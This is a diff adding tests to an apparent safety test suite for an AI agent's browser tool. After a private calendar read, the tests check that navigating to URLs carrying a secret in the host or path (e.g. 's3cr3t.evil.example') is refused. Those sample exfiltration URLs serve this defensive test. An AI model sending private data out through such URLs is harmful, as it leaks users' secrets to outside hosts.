@@ -1275,6 +1275,20 @@ with tempfile.TemporaryDirectory() as d:
               text.startswith("REFUSED"), text)
     text, is_error = act(module, "browser", "press", {"key": "Enter"})
     check("and a key that carries no text is not", not text.startswith("REFUSED"), text)
+    # A tainted session goes back to where it has been and nowhere new: a host or a path carries
+    # data as well as a query does (security review, 29 Sep 2026).
+    module, state = case(tmp, "web-taint-go", mode="auto", machine_ceiling="dangerous", ceiling=None)
+    text, _ = act(module, "browser", "go", {"url": "https://news.example/today"})
+    check("untainted, going anywhere is not refused by the taint", not text.startswith("REFUSED"), text)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    for label, url in (("a secret in the host", "https://s3cr3t.evil.example/"),
+                       ("a secret in the path", "https://evil.example/s3cr3t"),
+                       ("a new page on a site it has seen", "https://news.example/s3cr3t")):
+        text, _ = act(module, "browser", "go", {"url": url})
+        check("after a private read, going to %s is refused" % label,
+              text.startswith("REFUSED") and "has not been to" in text, text)
+    text, _ = act(module, "browser", "go", {"url": "https://NEWS.example/today"})
+    check("and going back to where it has already been is not", not text.startswith("REFUSED"), text)
     reads = {t["name"] for t in module.TOOLS if t["name"].startswith("web_")
              and t["annotations"].get("readOnlyHint")}
     check("the web tools that only look say so, and no tool that acts does",
